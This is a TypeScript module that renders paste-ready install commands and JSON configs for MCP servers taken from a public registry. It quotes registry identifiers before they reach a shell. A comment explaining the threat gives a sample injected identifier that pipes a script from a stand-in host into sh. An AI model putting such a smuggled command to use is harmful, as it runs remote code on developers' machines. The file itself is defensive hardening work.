// Generate install commands per client. Best-effort - falls back to manual JSON
// when the registry entry doesn't expose a runnable package or URL.

import type { IndexedServer } from './types';

export type InstallTarget = {
  client: 'claude-desktop' | 'claude-code' | 'cursor' | 'gemini-cli' | 'cline' | 'zed' | 'remote';
  label: string;
  command?: string;
  json?: string;
  notes?: string;
};

// Package identifiers come from the public MCP registry, which anyone can publish to, and
// three of the targets below are shell commands a developer copies into a terminal. An
// identifier of `pkg; curl evil.sh | sh` would render as a runnable command and execute on
// paste. shortName() sanitises the *display* token but never touched the identifier itself.
//
// Quote rather than reject: dropping the install method for an odd-but-legitimate identifier
// is a worse outcome than showing a quoted command that still works. Single-quoting is inert
// against every shell metacharacter, so this holds regardless of what a future registryType
// allows in a name.
//
// The safe set covers the entire live corpus (11,003 identifiers scanned 2026-07-27: zero
// contained shell metacharacters or whitespace; 1,317 contained ':' from OCI tags or were
// mcpb https URLs, both admitted here). So today this changes no rendered command.
const SHELL_SAFE = /^[A-Za-z0-9._:/@+-]+$/;

/** Render a registry-supplied value safe to paste into a shell. */
export function shellArg(v: string): string {
  if (SHELL_SAFE.test(v)) return v;
  // POSIX: close the quote, emit an escaped quote, reopen. `it's` -> `'it'\''s'`
  return `'${v.replaceAll("'", "'\\''")}'`;
}

function envBlock(s: IndexedServer): Record<string, string> | undefined {
  if (!s.envVars.length) return undefined;
  const env: Record<string, string> = {};
  for (const v of s.envVars) {
    env[v.name] = v.isSecret ? `<your-${v.name.toLowerCase()}>` : v.default ?? `<${v.name.toLowerCase()}>`;
  }
  return env;
}

export function buildInstalls(s: IndexedServer): InstallTarget[] {
  const out: InstallTarget[] = [];
  const env = envBlock(s);

  // Remote (HTTP/SSE) - preferred when available.
  if (s.remoteUrl) {
    out.push({
      client: 'remote',
      label: 'Remote endpoint',
      command: s.remoteUrl,
      notes: 'Streamable HTTP / SSE endpoint. Add to any MCP client that supports remote servers.',
    });
  }

  // npm package via npx.
  if (s.npmPackage) {
    out.push({
      client: 'claude-desktop',
      label: 'Claude Desktop (claude_desktop_config.json)',
      json: JSON.stringify(
        {
          mcpServers: {
            [shortName(s)]: {
              command: 'npx',
              args: ['-y', s.npmPackage],
              ...(env ? { env } : {}),
            },
          },
        },
        null,
        2,
      ),
    });
    out.push({
      client: 'cursor',
      label: 'Cursor (.cursor/mcp.json)',
      json: JSON.stringify(
        {
          mcpServers: {
            [shortName(s)]: {
              command: 'npx',
              args: ['-y', s.npmPackage],
              ...(env ? { env } : {}),
            },
          },
        },
        null,
        2,
      ),
    });
    out.push({
      client: 'cline',
      label: 'Cline (cline_mcp_settings.json)',
      command: `npx -y ${shellArg(s.npmPackage)}`,
    });
    const name = shortName(s);
    out.push({
      client: 'claude-code',
      label: 'Claude Code (claude mcp add)',
      command: `claude mcp add --scope user ${name} -- npx -y ${shellArg(s.npmPackage)}`,
    });
    out.push({
      client: 'gemini-cli',
      label: 'Gemini CLI (gemini mcp add)',
      command: `gemini mcp add -s user ${name} npx -y ${shellArg(s.npmPackage)}`,
    });
  }

  // pypi via uvx.
  if (s.pypiPackage) {
    out.push({
      client: 'claude-desktop',
      label: 'Claude Desktop (uvx)',
      json: JSON.stringify(
        {
          mcpServers: {
            [shortName(s)]: {
              command: 'uvx',
              args: [s.pypiPackage],
              ...(env ? { env } : {}),
            },
          },
        },
        null,
        2,
      ),
    });
  }

  // Docker.
  if (s.dockerImage) {
    out.push({
      client: 'claude-desktop',
      label: 'Claude Desktop (Docker)',
      json: JSON.stringify(
        {
          mcpServers: {
            [shortName(s)]: {
              command: 'docker',
              args: ['run', '--rm', '-i', s.dockerImage],
              ...(env ? { env } : {}),
            },
          },
        },
        null,
        2,
      ),
    });
  }

  return out;
}

function shortName(s: IndexedServer): string {
  return s.name.split('/').pop()!.replace(/[^a-zA-Z0-9-_]/g, '-');
}
